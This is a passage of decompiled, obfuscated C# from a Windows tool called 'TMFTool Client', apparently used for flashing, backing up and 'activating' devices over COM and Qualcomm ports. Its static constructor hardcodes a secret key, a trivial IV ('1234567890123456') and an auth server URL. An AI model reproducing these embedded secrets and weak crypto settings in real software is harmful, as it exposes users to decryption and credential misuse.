		((Control)this.m_130).Location = new Point(96, 7);
		((Control)this.m_130).Name = "checkbox6";
		((Control)this.m_130).Size = new Size(81, 25);
		((Control)this.m_130).TabIndex = 20;
		((Control)this.m_130).Text = "清除数据";
		((Control)this.m_12b).Controls.Add((Control)this.m_162);
		((Control)this.m_12b).Controls.Add((Control)this.m_102);
		((Control)this.m_12b).Dock = DockStyle.Fill;
		((Control)this.m_12b).Font = new Font("微软雅黑", 9f);
		((Control)this.m_12b).Location = new Point(3, 39);
		((Control)this.m_12b).Name = "tabPage17";
		((Control)this.m_12b).Size = new Size(477, 538);
		((Control)this.m_12b).TabIndex = 0;
		((Control)this.m_12b).Text = "Tools";
		((Control)this.m_162).Cursor = Cursors.Hand;
		((Control)this.m_162).Location = new Point(5, 73);
		((Control)this.m_162).Name = "tabs2";
		((iCollection<AntdUI.TabPage>)(object)((Tabs)this.m_162).Pages).Add((AntdUI.TabPage)this.m_163);
		((iCollection<AntdUI.TabPage>)(object)((Tabs)this.m_162).Pages).Add((AntdUI.TabPage)this.m_164);
		((Control)this.m_162).Size = new Size(469, 465);
		((Tabs)this.m_162).Style = (IStyle)(object)style2;
		((Control)this.m_162).TabIndex = 46;
		((Control)this.m_162).Text = "tabs2";
		((Control)this.m_163).Controls.Add((Control)this.m_fb);
		((Control)this.m_163).Dock = DockStyle.Fill;
		((Control)this.m_163).Location = new Point(3, 29);
		((Control)this.m_163).Name = "tabPage11";
		((Control)this.m_163).Size = new Size(463, 433);
		((Control)this.m_163).TabIndex = 0;
		((Control)this.m_163).Text = "辅助功能";
		((Control)this.m_164).Controls.Add((Control)this.m_168);
		((Control)this.m_164).Controls.Add((Control)this.m_165);
		((Control)this.m_164).Controls.Add((Control)this.m_166);
		((Control)this.m_164).Controls.Add((Control)this.m_167);
		((Control)this.m_164).Dock = DockStyle.Fill;
		((Control)this.m_164).Location = new Point(3, 29);
		((Control)this.m_164).Name = "tabPage12";
		((Control)this.m_164).Size = new Size(463, 433);
		((Control)this.m_164).TabIndex = 0;
		((Control)this.m_164).Text = "调试区域";
		((Control)this.m_164).Visible = false;
		((Control)this.m_168).Location = new Point(3, 394);
		((Control)this.m_168).Name = "Comspd";
		((Input)this.m_168).PlaceholderText = "COM速率";
		((Control)this.m_168).Size = new Size(102, 35);
		((Control)this.m_168).TabIndex = 57;
		((Control)this.m_168).Text = "9600";
		((Control)this.m_165).BackColor = Color.FromArgb(80, 160, 255);
		((ButtonBase)this.m_165).FlatStyle = FlatStyle.Flat;
		((Control)this.m_165).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_165).ForeColor = Color.White;
		((Control)this.m_165).Location = new Point(371, 11);
		((Control)this.m_165).Name = "button10";
		((Control)this.m_165).Size = new Size(81, 28);
		((Control)this.m_165).TabIndex = 56;
		((Control)this.m_165).Text = "粘贴";
		((ButtonBase)this.m_165).UseVisualStyleBackColor = false;
		((Control)this.m_166).BackColor = Color.FromArgb(80, 160, 255);
		((ButtonBase)this.m_166).FlatStyle = FlatStyle.Flat;
		((Control)this.m_166).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_166).ForeColor = Color.White;
		((Control)this.m_166).Location = new Point(371, 360);
		((Control)this.m_166).Name = "xmlsendbut";
		((Control)this.m_166).Size = new Size(81, 28);
		((Control)this.m_166).TabIndex = 55;
		((Control)this.m_166).Text = "发送";
		((ButtonBase)this.m_166).UseVisualStyleBackColor = false;
		((Control)this.m_166).Click += _1a6;
		((Input)this.m_167).AllowClear = true;
		((Control)this.m_167).Location = new Point(3, 7);
		((Input)this.m_167).Multiline = true;
		((Control)this.m_167).Name = "xmltext";
		((Input)this.m_167).PlaceholderText = "XMl调试命令";
		((Control)this.m_167).Size = new Size(362, 381);
		((Control)this.m_167).TabIndex = 0;
		((Control)_13f).BackColor = Color.LightSkyBlue;
		((Control)_13f).Font = new Font("微软雅黑", 12f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)_13f).ForeColor = Color.White;
		((IControl)_13f).HandCursor = Cursors.Arrow;
		((WindowBar)_13f).IsMax = false;
		((Control)_13f).Location = new Point(0, -1);
		((WindowBar)_13f).MaximizeBox = false;
		((Control)_13f).Name = "windowBar1";
		((Control)_13f).Size = new Size(953, 28);
		((Control)_13f).TabIndex = 60;
		((Control)_13f).Text = "TMFTool Client";
		((WindowBar)_13f).UseSystemStyleColor = true;
		((Control)this.m_140).BackColor = SystemColors.ButtonHighlight;
		((TextBoxBase)this.m_140).BorderStyle = BorderStyle.None;
		((Control)this.m_140).Cursor = Cursors.IBeam;
		((Control)this.m_140).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_140).ForeColor = Color.Black;
		((Control)this.m_140).Location = new Point(1095, 58);
		((Control)this.m_140).Name = "richTextBoxfhLog";
		((TextBoxBase)this.m_140).ReadOnly = true;
		((Control)this.m_140).Size = new Size(354, 702);
		((Control)this.m_140).TabIndex = 56;
		((Control)this.m_140).TabStop = false;
		((Control)this.m_140).Text = "";
		((ContainerControl)this).AutoScaleMode = AutoScaleMode.None;
		((Control)(object)this).BackColor = Color.White;
		((Form)this).ClientSize = new Size(953, 681);
		((Control)this).Controls.Add((Control)_13f);
		((Control)this).Controls.Add((Control)this.m_127);
		((Control)this).Controls.Add((Control)this.m_e5);
		((Control)this).Controls.Add((Control)this.m_140);
		((Control)this).Controls.Add((Control)this.m_e7);
		((Control)this).Controls.Add((Control)this.m_99);
		((Control)this).Controls.Add((Control)this.m_87);
		((Control)this).Controls.Add((Control)this.m_c1);
		((Control)this).Controls.Add((Control)this.m_8f);
		((Control)(object)this).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)(object)this).ForeColor = Color.FromArgb(64, 64, 64);
		((Form)this).FormBorderStyle = FormBorderStyle.FixedSingle;
		((Form)this).Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		((Form)this).MaximizeBox = false;
		((Control)this).Name = "Form1";
		((Control)this).Padding = new Padding(0, 29, 0, 0);
		((Form)this).StartPosition = FormStartPosition.CenterScreen;
		((Control)(object)this).Text = "TMFTool Client";
		((Form)this).FormClosing += _80;
		((Form)this).Load += _7b;
		((Control)this).GiveFeedback += _163;
		((Control)this.m_8f).ResumeLayout(false);
		((Control)this.m_90).ResumeLayout(false);
		((Control)this.m_90).PerformLayout();
		((ISupportInitialize)this.m_143).EndInit();
		((Control)this.m_99).ResumeLayout(false);
		((Control)this.m_99).PerformLayout();
		((Control)this.m_de).ResumeLayout(false);
		((Control)this.m_dd).ResumeLayout(false);
		((Control)this.m_d7).ResumeLayout(false);
		((Control)this.m_d7).PerformLayout();
		((Control)this.m_f8).ResumeLayout(false);
		((Control)this.m_f9).ResumeLayout(false);
		((Control)this.m_f0).ResumeLayout(false);
		((Control)this.m_103).ResumeLayout(false);
		((Control)this.m_104).ResumeLayout(false);
		((Control)this.m_fb).ResumeLayout(false);
		((Control)fc).ResumeLayout(false);
		((Control)fd).ResumeLayout(false);
		((Control)this.m_fe).ResumeLayout(false);
		((Control)ff).ResumeLayout(false);
		((Control)this.m_101).ResumeLayout(false);
		((Control)this.m_f7).ResumeLayout(false);
		((Control)this.m_154).ResumeLayout(false);
		((Control)this.m_155).ResumeLayout(false);
		((Control)this.m_15d).ResumeLayout(false);
		((Control)this.m_15e).ResumeLayout(false);
		((Control)this.m_e5).ResumeLayout(false);
		((Control)this.m_e5).PerformLayout();
		((Control)this.m_e6).ResumeLayout(false);
		((Control)this.m_e6).PerformLayout();
		((Control)this.m_e8).ResumeLayout(false);
		((Control)this.m_e9).ResumeLayout(false);
		((Control)this.m_10f).ResumeLayout(false);
		((Control)this.m_10f).PerformLayout();
		((Control)this.m_115).ResumeLayout(false);
		((Control)this.m_127).ResumeLayout(false);
		((Control)this.m_128).ResumeLayout(false);
		((Control)this.m_129).ResumeLayout(false);
		((Control)this.m_12a).ResumeLayout(false);
		((Control)this.m_12f).ResumeLayout(false);
		((Control)this.m_176).ResumeLayout(false);
		((Control)this.m_176).PerformLayout();
		((ISupportInitialize)this.m_16e).EndInit();
		((Control)this.m_137).ResumeLayout(false);
		((Control)this.m_136).ResumeLayout(false);
		((Control)this.m_12b).ResumeLayout(false);
		((Control)this.m_163).ResumeLayout(false);
		((Control)this.m_164).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static Form1()
	{
		Form1.m_74 = (IntPtr)1;
		Form1.m_7a = "vUMOvZPH8wjmmExm0QbAcsBwVY6TYBU9";
		Form1.m_7b = "1234567890123456";
		BaseUrl = "https://auth.llxll.cn";
	}

	[CompilerGenerated]
	private Task _1b9()
	{
		return _3(((CancellationTokenSource)_0).Token);
	}

	[CompilerGenerated]
	private Task _1ba()
	{
		return _4(((CancellationTokenSource)this.m_1).Token);
	}

	[CompilerGenerated]
	private Task _1bb()
	{
		return _3(((CancellationTokenSource)_0).Token);
	}

	[CompilerGenerated]
	private Task _1bc()
	{
		return _4(((CancellationTokenSource)this.m_1).Token);
	}

	[CompilerGenerated]
	private Task _1bd()
	{
		return b(((CancellationTokenSource)this.m_4).Token);
	}

	[CompilerGenerated]
	private Task _1be()
	{
		return d(((CancellationTokenSource)this.m_5).Token);
	}

	[CompilerGenerated]
	private void _1bf()
	{
		((Form)this).Close();
	}

	[CompilerGenerated]
	private void _1c0()
	{
		((ToolStripItem)this.m_12)?.PerformClick();
	}

	[CompilerGenerated]
	private void _1c1()
	{
		((Checkbox)this.m_109).Checked = true;
		EnableButtons();
		if (this.m_11 != null)
		{
			if (((Control)this.m_11).InvokeRequired)
			{
				((Control)this.m_11).Invoke((Delegate)(Action)(() =>
				{
					((Button)this.m_11).PerformClick();
				}));
			}
			else
			{
				((Button)this.m_11).PerformClick();
			}
			this.m_11 = null;
		}
		if (((ToolStripItem)this.m_12)?.Owner != null)
		{
			((ToolStripItem)this.m_12).Owner.Invoke((Action)(() =>
			{
				((ToolStripItem)this.m_12)?.PerformClick();
			}));
			this.m_12 = null;
		}
	}

	[CompilerGenerated]
	private void _1c2()
	{
		((Button)this.m_11).PerformClick();
	}

	[CompilerGenerated]
	private void _1c3()
	{
		((ToolStripItem)this.m_12)?.PerformClick();
	}

	[CompilerGenerated]
	private void _1c4()
	{
		((Form)this).DialogResult = AntdUI.Modal.open((Form)(object)this, "分区备份完成 \n" + BACKUPFOLDER_Path + " \n是否打开文件夹？", "提示", (TType)1);
	}

	[CompilerGenerated]
	private void _1c5()
	{
		if (lang == "zh")
		{
			((Control)this.m_cf).Text = "刷写操作结束";
			((Control)this.m_cd).Text = "";
		}
		else
		{
			((Control)this.m_cf).Text = "The flashing operation ends";
		}
	}

	[CompilerGenerated]
	private void _1c6(long p, long t, object l)
	{
		double num = (double)(p * 100) / (double)t;
		((UIProcessBar)this.m_c1).Value = (int)(num * 100.0);
		((UIProcessBar)this.m_c1).Maximum = 10000;
		((Control)this.m_c1).Text = num.ToString("0.00") + "%";
		((Control)this.m_cf).Text = (string)l + " : [" + (string)_60(p) + "/" + (string)_60(t) + "]";
		string text = (string)_5f((double)(p / 1024) / ((Stopwatch)this.m_4b).Elapsed.TotalSeconds) + " /s";
		((Control)this.m_cd).Text = text ?? "";
	}

	[CompilerGenerated]
	private void _1c7(long p, long t, object l)
	{
		double num = (double)(p * 100) / (double)t;
		((UIProcessBar)this.m_c1).Value = (int)(num * 100.0);
		((UIProcessBar)this.m_c1).Maximum = 10000;
		((Control)this.m_c1).Text = num.ToString("0.00") + "%";
		((Control)this.m_cf).Text = (string)l + " : [" + (string)_60(p) + "/" + (string)_60(t) + "]";
		string text = (string)_5f((double)(p / 1024) / ((Stopwatch)this.m_4b).Elapsed.TotalSeconds) + " /s";
		((Control)this.m_cd).Text = text ?? "";
	}

	[CompilerGenerated]
	private object _1c9()
	{
		return c8();
	}

	[CompilerGenerated]
	private object _1ca()
	{
		return b8();
	}

	[CompilerGenerated]
	private object _1cb()
	{
		return b8();
	}

	[CompilerGenerated]
	private object _1cc()
	{
		return b8();
	}

	[CompilerGenerated]
	private void _1cd(uint progress)
	{
		((UIProcessBar)this.m_c1).Value = (int)progress;
	}

	[CompilerGenerated]
	private void _1ce()
	{
		((UIProcessBar)this.m_c1).Value = 0;
		c5((uint)((UIProcessBar)this.m_c1).Maximum);
		fe("\n");
		((RichTextBox)this.m_c8).SelectionColor = Color.Red;
		((TextBoxBase)this.m_c8).AppendText("激活设备成功 请重启设备！\n");
		((Control)this.m_cf).Text = "设备状态正常";
		((TextBoxBase)this.m_c8).ScrollToCaret();
		if (((Checkbox)this.m_108).Checked)
		{
			OpenDisk(PortQcom);
			Log2("重启设备...", Color.Black, isBold: false, newline: true);
			_56();
			((Checkbox)this.m_109).Checked = false;
			Log2("OK", Color.DodgerBlue, isBold: false);
			Log2("", Color.DodgerBlue, isBold: false, newline: true);
			((Control)this.m_cf).Text = "重启设备完成";
			DiskClose();
		}
		cb();
		cc();
		((Control)this.m_ed).Enabled = true;
		((Control)this.m_89).Enabled = true;
		((Control)_88).Enabled = true;
		((Control)this.m_c2).Enabled = true;
		((Control)this.m_cb).Enabled = true;
		((Control)this.m_ec).Enabled = true;
		((Control)this.m_c6).Enabled = true;
		((Control)this.m_c2).Enabled = true;
	}

	[CompilerGenerated]
	private void _1cf(uint progress)
	{
		((UIProcessBar)this.m_c1).Value = (int)progress;
	}

	[CompilerGenerated]
	private void _1d0()
	{
		((UIProcessBar)this.m_c1).Value = 0;
		c5((uint)((UIProcessBar)this.m_c1).Maximum);
		fe("\n");
		((RichTextBox)this.m_c8).SelectionColor = Color.Red;
		((TextBoxBase)this.m_c8).AppendText("激活设备完成，请重启设备！\n");
		((TextBoxBase)this.m_c8).ScrollToCaret();
		((Control)this.m_cf).Text = "设备正常";
		if (((Checkbox)this.m_108).Checked)
		{
			OpenDisk(PortQcom);
			Log2("重启设备...", Color.Black, isBold: false, newline: true);
			_56();
			((Checkbox)this.m_109).Checked = false;
			Log2("OK", Color.DodgerBlue, isBold: false);
			Log2("", Color.DodgerBlue, isBold: false, newline: true);
			((Control)this.m_cf).Text = "重启设备完成";
			DiskClose();
		}
		cb();
		cc();
		((Control)this.m_ed).Enabled = true;
		((Control)this.m_89).Enabled = true;
		((Control)_88).Enabled = true;
		((Control)this.m_c2).Enabled = true;
		((Control)this.m_cb).Enabled = true;
		((Control)this.m_ec).Enabled = true;
		((Control)this.m_c6).Enabled = true;
		((Control)this.m_c2).Enabled = true;
	}

	[CompilerGenerated]
	private object _1d1()
	{
		return c7();
	}

	[CompilerGenerated]
	private void _1d2()
	{
		c5(5u);
	}

	[CompilerGenerated]
	private object _1d3()
	{
		return b9();
	}

	[CompilerGenerated]
	private uint _1d4(object text)
	{
		return d4(text);
	}

	[CompilerGenerated]
	private uint _1d5(object text)
	{
		return d4(text);
	}

	[CompilerGenerated]
	private object _1d6()
	{
		return c7();
	}

	[CompilerGenerated]
	private uint _1d7(object text)
	{
		return d4(text);
	}

	[CompilerGenerated]
	private uint _1d8(object text)
	{
		return d4(text);
	}

	[CompilerGenerated]
	private object _1d9()
	{
		return c7();
	}

	[CompilerGenerated]
	private object _1da()
	{
		return b7();
	}

	[CompilerGenerated]
	private void _1db()
	{
		((List<string>)this.m_75).Clear();
		((UIComboBox)this.m_126).Items.Clear();
		((Control)this.m_126).Text = string.Empty;
	}

	[CompilerGenerated]
	private void _1dc()
	{
		((UICheckBox)this.m_cc).Checked = false;
	}

	[CompilerGenerated]
	private void _1dd(object message)
	{
		((TextBoxBase)this.m_c8).AppendText((string)message);
		((TextBoxBase)this.m_c8).ScrollToCaret();
	}

	[CompilerGenerated]
	private void _1de()
	{
		((UIProcessBar)this.m_c1).Maximum = 10000;
		((UIProcessBar)this.m_c1).Value = 0;
	}

	[CompilerGenerated]
	private void _1df()
	{
		((UIProcessBar)this.m_c1).Value = ((UIProcessBar)this.m_c1).Maximum;
	}

	[CompilerGenerated]
	private void _1e0(object s, object e)
	{
		((UIProcessBar)this.m_c1).Value = ((ProgressChangedEventArgs)e).ProgressPercentage;
	}

	[CompilerGenerated]
	private object _1e1()
	{
		return b8();
	}

	[CompilerGenerated]
	private void _1e2(object path)
	{
		try
		{
			if (File.Exists((string)path))
			{
				File.Delete((string)path);
				fa();
				Msg("删除文件成功: " + Path.GetFileName((string)path) + "\n");
			}
			else
			{
				fb();
				Msg("文件不存在，跳过: " + Path.GetFileName((string)path) + "\n");
			}
		}
		catch (Exception ex)
		{
			msgred();
			Msg("删除文件失败: " + Path.GetFileName((string)path) + "  错误: " + ex.Message + "\n");
		}
	}

	[CompilerGenerated]
	private void _1e3(object src, object dest)
	{
		try
		{
			if (File.Exists((string)src))
			{
				if (File.Exists((string)dest))
				{
					File.Delete((string)dest);
				}
				File.Move((string)src, (string)dest);
				fa();
				Msg("重命名成功: " + Path.GetFileName((string)src) + " -> " + Path.GetFileName((string)dest) + "\n");
			}
			else
			{
				fb();
				Msg("源文件不存在，跳过: " + Path.GetFileName((string)src) + "\n");
			}
		}
		catch (Exception ex)
		{
			msgred();
			Msg("重命名失败: " + Path.GetFileName((string)src) + " -> " + Path.GetFileName((string)dest) + "  错误: " + ex.Message + "\n");
		}
	}

	[CompilerGenerated]
	private void _1e4(uint progress)
	{
		((UIProcessBar)this.m_c1).Value = (int)progress;
	}

	[CompilerGenerated]
	private void _1e5((double percent, double speedMBps) value)
	{
		((UIProcessBar)this.m_c1).Value = Math.Min(10000, (int)(value.percent * 10000.0));
		((Control)this.m_cd).Text = $"速度: {value.speedMBps:F2} MB/s";
	}

	[CompilerGenerated]
	private void _1e6(uint progress)
	{
		((UIProcessBar)this.m_c1).Value = (int)progress;
	}

	[CompilerGenerated]
	private void _1e7(uint progress)
	{
		((UIProcessBar)this.m_c1).Value = (int)progress;
	}

	[CompilerGenerated]
	private void _1e8(uint progress)
	{
		((UIProcessBar)this.m_c1).Value = (int)progress;
	}

	[CompilerGenerated]
	private void _1e9(uint progress)
	{
		((UIProcessBar)this.m_c1).Value = (int)progress;
	}

	[CompilerGenerated]
	private void _1ea(uint progress)
	{
		((UIProcessBar)this.m_c1).Value = (int)progress;
	}
}
